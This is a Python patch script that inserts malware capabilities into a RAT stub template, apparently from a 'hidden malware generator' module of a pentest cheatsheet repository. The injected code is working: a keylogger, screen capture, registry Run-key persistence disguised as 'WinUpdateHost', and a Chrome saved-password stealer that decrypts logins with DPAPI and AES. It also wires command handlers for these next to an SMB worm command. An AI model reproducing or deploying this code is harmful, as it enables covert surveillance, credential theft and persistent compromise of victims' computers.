import os

file_path = r'C:\Users\ASUS\Desktop\Pentest-Cheatsheet-master\Moduller\11_Gizli_Zararli_Olusturucu\stub_template.py'

with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

new_functions = '''
import threading

keylog_data = ""
keylog_thread = None
keylog_running = False

def keylogger_worker():
    global keylog_data, keylog_running
    try:
        from ctypes import windll, byref, c_int
        from ctypes.wintypes import MSG
        user32 = windll.user32
        
        while keylog_running:
            for i in range(1, 256):
                if user32.GetAsyncKeyState(i) & 1:
                    if i == 13: keylog_data += "\\n"
                    elif i == 8: keylog_data = keylog_data[:-1]
                    elif i == 32: keylog_data += " "
                    else:
                        try: keylog_data += chr(i)
                        except: pass
            time.sleep(0.01)
    except Exception as e:
        keylog_data += f"[Keylogger Error: {e}]"

def screenshot():
    try:
        import ctypes
        from PIL import ImageGrab
        img = ImageGrab.grab()
        import io
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        return base64.b64encode(img_bytes.getvalue())
    except Exception as e:
        try:
            # Fallback to Powershell
            ps_script = """
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
            $gfx = [System.Drawing.Graphics]::FromImage($bmp)
            $gfx.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
            $stream = New-Object System.IO.MemoryStream
            $bmp.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
            [Convert]::ToBase64String($stream.ToArray())
            """
            res = subprocess.run(["powershell", "-c", ps_script], capture_output=True, text=True)
            return res.stdout.encode()
        except:
            return f"Screenshot error: {e}".encode()

def persist():
    try:
        exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        cmd = f'REG ADD "HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /V "WinUpdateHost" /t REG_SZ /F /D "{exe_path}"'
        subprocess.run(cmd, shell=True, capture_output=True)
        return b"Persistence successfully installed to HKCU\\\\...\\\\Run"
    except Exception as e:
        return f"Persistence error: {e}".encode()

def steal_passwords():
    try:
        import sqlite3, json, win32crypt, shutil
        import os
        from Crypto.Cipher import AES
        
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        login_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        
        if not os.path.exists(local_state_path) or not os.path.exists(login_data_path):
            return b"Chrome not found or no passwords saved."
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
            
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:] 
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        
        temp_login = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Temp", "login_db")
        shutil.copy2(login_data_path, temp_login)
        
        conn = sqlite3.connect(temp_login)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        passwords = ""
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            
            if not encrypted_password: continue
            
            try:
                iv = encrypted_password[3:15]
                payload = encrypted_password[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                if username or decrypted_pass:
                    passwords += f"URL: {url}\\nUSER: {username}\\nPASS: {decrypted_pass}\\n{'='*50}\\n"
            except:
                pass
                
        cursor.close()
        conn.close()
        os.remove(temp_login)
        
        return passwords.encode() if passwords else b"No passwords found."
    except Exception as e:
        return f"Stealer error: {e}".encode()
'''

content = content.replace('def run_cmd(command):', new_functions + '\ndef run_cmd(command):')

run_cmd_mod = '''
        if command.startswith("cd "):
            os.chdir(command[3:].strip())
            return b"Directory changed"
        elif command == "!suicide":
            sys.exit(0)
        elif command == "!worm_smb":
            return smb_worm()
        elif command == "!persist":
            return persist()
        elif command == "!screenshot":
            return screenshot()
        elif command == "!steal_passwords":
            return steal_passwords()
        elif command == "!keylog_start":
            global keylog_running, keylog_thread
            if not keylog_running:
                keylog_running = True
                keylog_thread = threading.Thread(target=keylogger_worker, daemon=True)
                keylog_thread.start()
                return b"Keylogger started in background."
            return b"Keylogger is already running."
        elif command == "!keylog_dump":
            global keylog_data
            data = keylog_data
            keylog_data = ""
            return data.encode() if data else b"No keystrokes captured yet."
'''

old_run_cmd = '''
        if command.startswith("cd "):
            os.chdir(command[3:].strip())
            return b"Directory changed"
        elif command == "!suicide":
            sys.exit(0)
        elif command == "!worm_smb":
            return smb_worm()
'''

content = content.replace(old_run_cmd, run_cmd_mod)

with open(file_path, 'w', encoding='utf-8') as f:
    f.write(content)
